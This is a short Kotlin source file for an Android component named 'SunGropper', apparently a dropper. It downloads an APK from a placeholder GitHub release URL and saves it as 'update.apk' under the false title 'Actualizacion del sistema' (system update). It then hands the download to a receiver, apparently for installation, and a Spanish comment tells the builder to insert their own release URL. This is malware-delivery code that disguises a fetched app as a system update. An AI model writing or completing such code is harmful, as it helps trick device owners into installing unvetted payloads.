package com.sys.sun

import android.app.DownloadManager
import android.content.Context
import android.net.Uri
import android.os.Environment

object SunGropper {
    fun start(context: Context) {
        val isInstalled = try {
            context.packageManager.getPackageInfo("com.sys.sun", 0)
            true
        } catch (e: Exception) {
            false
        }

        if (!isInstalled) {
            // ⚠️ ACÁ VAS A PONER LA URL DE TU GITHUB RELEASE MÁS ADELANTE
            val apkUrl = "https://github.com/tu-usuario/tu-repo/releases/download/v1.0/update.apk"
            
            val request = DownloadManager.Request(Uri.parse(apkUrl))
            request.setMimeType("application/vnd.android.package-archive")
            request.setTitle("Actualizacion del sistema")
            request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, "update.apk")
            
            val dm = context.getSystemService(Context.DOWNLOAD_SERVICE) as DownloadManager
            val downloadId = dm.enqueue(request)
            SunReceiver.downloadId = downloadId
        }
    }
}
